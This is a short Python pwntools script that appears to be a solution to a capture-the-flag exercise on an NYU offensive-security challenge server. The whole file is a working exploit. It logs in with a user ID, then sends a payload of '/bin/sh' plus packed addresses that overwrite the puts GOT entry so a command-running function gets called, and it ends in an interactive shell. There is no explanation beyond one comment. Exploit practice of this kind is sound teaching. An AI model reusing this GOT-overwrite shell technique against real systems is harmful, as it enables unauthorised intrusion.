from pwn import *
context.log_level = "DEBUG"

p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1341)
p.recvuntil(":")
p.sendline("svv232")
p.recvline()
p.recvline()
#control 23 bytes of data
puts = 0x601018
command = "/bin/sh\x00"
run_cmd = 0x40074b


p.sendline(command +p64(run_cmd)+ p64(puts - 0x8))
p.interactive()
